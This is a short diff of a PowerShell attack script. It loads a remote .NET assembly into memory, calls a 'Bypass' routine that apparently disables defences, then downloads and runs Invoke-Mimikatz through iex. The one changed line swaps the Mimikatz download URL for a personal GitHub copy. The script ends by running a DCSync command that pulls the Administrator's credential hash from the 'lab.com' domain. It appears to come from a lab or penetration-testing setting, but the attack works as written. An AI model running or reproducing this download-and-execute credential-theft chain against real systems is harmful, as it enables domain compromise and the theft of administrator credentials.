@@ -6,5 +6,5 @@ $data = (New-Object System.Net.WebClient).DownloadData('https://github.com/K1001
 $assem = [System.Reflection.Assembly]::Load($data)
 [Nativebridge4]::Bypass()
 
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+iex(New-Object Net.WebClient).DownloadString('https://github.com/K1001011/Public/raw/main/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator /domain:lab.com" "exit"'
